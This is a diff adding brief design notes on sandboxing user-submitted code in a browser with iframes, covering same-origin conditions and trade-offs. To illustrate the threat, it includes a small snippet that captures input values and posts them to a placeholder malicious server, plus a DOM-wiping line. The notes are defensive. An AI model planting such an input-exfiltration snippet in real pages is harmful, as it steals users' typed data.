@@ -1,0 +1,36 @@
+Code execution
+
+User-provided code might throw errors and cause the program to crash
+User-provided code might mutate the DOM, causing our program to crash
+document.body.innerHTML = ''
+A user might accidentally run code provided by another malicious user
+document.querySelector('input').addEventListener('change', (e) => {
+  axios.post('malicous.server', {
+    value: event.target.value
+  })
+})
+
+Solution is iFrame
+
+
+
+Driect access between frames is allowed when 
+
+The iframe element does not have a 'sandbox' property, or has a 'sandbox='"allow-same-origin" property
+
+AND
+
+We fetch the parent HTML doc and the frame HTML doc forom the exact same 
+Domain,
+Port, 
+Protocol (http vs. https)
+
+trade off
+user cannot use local storage of the broswer
+
+but we dont need to make any outside requests. Performance 
+
+
+big issue
+
+1. maximum size of file when assign large file to iframe srcdoc attibute
